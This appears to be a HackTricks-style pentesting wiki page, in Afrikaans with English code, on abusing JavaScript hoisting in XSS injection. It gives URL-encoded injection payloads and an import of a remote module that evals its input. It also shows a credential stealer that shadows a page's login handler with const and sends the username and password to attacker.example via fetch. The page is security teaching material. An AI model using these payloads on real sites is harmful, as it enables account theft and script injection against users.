# JS Hoisting

{{#include ../../banners/hacktricks-training.md}}

## Basic Information

In die JavaScript-taal word 'n meganisme bekend as **Hoisting** beskryf, waar verklarings van variables, functions, classes of imports konseptueel na die bokant van hul scope verskuif word voordat die kode uitgevoer word. Hierdie proses word outomaties deur die JavaScript engine uitgevoer, wat die skrip in verskeie passe deurloop.

Tydens die eerste pas parse die engine die kode om na syntax errors te kyk en dit in 'n abstract syntax tree te transformeer. Hierdie fase sluit hoisting in, 'n proses waar sekere declarations na die top van die execution context beweeg word. As die parsing-fase suksesvol is, wat aandui dat daar geen syntax errors is nie, gaan die skrip se uitvoering voort.

Dit is belangrik om te verstaan dat:

1. Die skrip moet vry van syntax errors wees voordat uitvoering kan plaasvind. Syntax-reëls moet streng nageleef word.
2. Die plasing van kode binne die skrip beïnvloed uitvoering weens hoisting, selfs al kan die uitgevoerde kode verskil van sy tekstuele voorstelling.

#### Types of Hoisting

Volgens MDN is daar vier uiteenlopende tipes hoisting in JavaScript:

1. **Value Hoisting**: Maak dit moontlik om 'n variable se waarde binne sy scope te gebruik voor die lyn van deklarasie.
2. **Declaration Hoisting**: Laat toe om 'n variable binne sy scope te verwys voor die deklarasie sonder om 'n `ReferenceError` te veroorsaak, maar die variable se waarde sal `undefined` wees.
3. Hierdie tipe verander die gedrag binne sy scope omdat die variable se deklarasie voor sy werklike deklarasielyn voorkom.
4. Die deklarasie se newe-effekte gebeur voordat die res van die kode wat dit bevat geëvalueer word.

In meer detail vertoon function declarations tipe 1 hoisting-gedrag. Die `var` sleutelwoord demonstreer tipe 2-gedrag. Lexical declarations, wat `let`, `const`, en `class` insluit, vertoon tipe 3-gedrag. Laastens is `import` statements uniek omdat hulle met beide tipe 1 en tipe 4 gedrag gehys word.

## Scenarios

Indien jy dus scenarios het waar 'n undeclared object gebruik word en jy kan **Inject JS code after an undeclared object**, kan jy die sintaksis **fix the syntax** deur dit te declare (sodat jou kode uitgevoer word in plaas daarvan om 'n fout te gooi):
```javascript
// The function vulnerableFunction is not defined
vulnerableFunction('test', '<INJECTION>');
// You can define it in your injection to execute JS
//Payload1: param='-alert(1)-'')%3b+function+vulnerableFunction(a,b){return+1}%3b
'-alert(1)-''); function vulnerableFunction(a,b){return 1};

//Payload2: param=test')%3bfunction+vulnerableFunction(a,b){return+1}%3balert(1)
test'); function vulnerableFunction(a,b){ return 1 };alert(1)
```

```javascript
// If a variable is not defined, you could define it in the injection
// In the following example var a is not defined
function myFunction(a,b){
return 1
};
myFunction(a, '<INJECTION>')

//Payload: param=test')%3b+var+a+%3d+1%3b+alert(1)%3b
test'); var a = 1; alert(1);
```

```javascript
// If an undeclared class is used, you cannot declare it AFTER being used
var variable = new unexploitableClass();
<INJECTION>
// But you can actually declare it as a function, being able to fix the syntax with something like:
function unexploitableClass() {
return 1;
}
alert(1);
```

```javascript
// Properties are not hoisted
// So the following examples where the 'cookie' attribute doesn´t exist
// cannot be fixed if you can only inject after that code:
test.cookie("leo", "INJECTION")
test[("cookie", "injection")]
```
## Meer scenario's
```javascript
// Undeclared var accessing to an undeclared method
x.y(1,INJECTION)
// You can inject
alert(1));function x(){}//
// And execute the allert with (the alert is resolved before it's detected that the "y" is undefined
x.y(1,alert(1));function x(){}//)
```

```javascript
// Undeclared var accessing 2 nested undeclared method
x.y.z(1,INJECTION)
// You can inject
");import {x} from "https://example.com/module.js"//
// It will be executed
x.y.z("alert(1)");import {x} from "https://example.com/module.js"//")


// The imported module:
// module.js
var x = {
y: {
z: function(param) {
eval(param);
}
}
};

export { x };
```

```javascript
// In this final scenario from https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/
// It was injected the: let config;`-alert(1)`//`
// With the goal of making in the block the var config be empty, so the return is not executed
// And the same injection was replicated in the body URL to execute an alert

try {
if (config) {
return
}
// TODO handle missing config for: https://try-to-catch.glitch.me/"+`
let config
;`-alert(1)` //`+"
} catch {
fetch("/error", {
method: "POST",
body: {
url:
"https://try-to-catch.glitch.me/" +
`
let config;` -
alert(1) -
`//` +
"",
},
})
}
trigger()
```
### Voorkom latere deklarasies deur 'n naam met const te sluit

As jy kan uitvoer voordat 'n top-level `function foo(){...}` gepars is, sal die verklaring van 'n leksikale binding met dieselfde naam (bv. `const foo = ...`) verhinduer dat die latere function-verklaring daardie identifiseerder herbind. Hierdie tegniek kan in RXSS misbruik word om kritieke handlers wat later op die bladsy gedefinieer is, te kap:
```javascript
// Malicious code runs first (e.g., earlier inline <script>)
const DoLogin = () => {
const pwd  = Trim(FormInput.InputPassword.value)
const user = Trim(FormInput.InputUtente.value)
fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd))
}

// Later, the legitimate page tries to declare:
function DoLogin(){ /* ... */ } // cannot override the existing const binding
```
Aantekeninge
- Dit berus op uitvoeringvolgorde en globale (top-level) scope.
- As jou payload binne `eval()` uitgevoer word, onthou dat `const/let` binne `eval` block-scoped is en nie globale bindings sal skep nie. Inject 'n nuwe `<script>` element met die kode om 'n ware globale `const` te vestig.

## Verwysings

- [https://jlajara.gitlab.io/Javascript_Hoisting_in_XSS_Scenarios](https://jlajara.gitlab.io/Javascript_Hoisting_in_XSS_Scenarios)
- [https://developer.mozilla.org/en-US/docs/Glossary/Hoisting](https://developer.mozilla.org/en-US/docs/Glossary/Hoisting)
- [https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/](https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/)
- [From "Low-Impact" RXSS to Credential Stealer: A JS-in-JS Walkthrough](https://r3verii.github.io/bugbounty/2025/08/25/rxss-credential-stealer.html)

{{#include ../../banners/hacktricks-training.md}}
